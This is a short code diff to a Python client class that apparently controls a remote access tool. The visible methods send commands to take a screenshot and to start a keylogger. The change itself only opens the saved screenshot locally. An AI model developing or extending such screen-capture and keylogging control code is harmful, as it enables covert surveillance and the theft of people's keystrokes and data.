@@ -137,6 +137,7 @@ class Client:
   def take_screenshot(self):
     self.socket.send(CMD_TAKE_SCREENSHOT.encode())
     self.save_file(TMP_PATH, 'screenshot.png', 'wb')
+    os.startfile(os.path.join(TMP_PATH, 'screenshot.png'))
 
   def start_keylogger(self):
     self.socket.send(CMD_START_KEYLOGGER.encode())
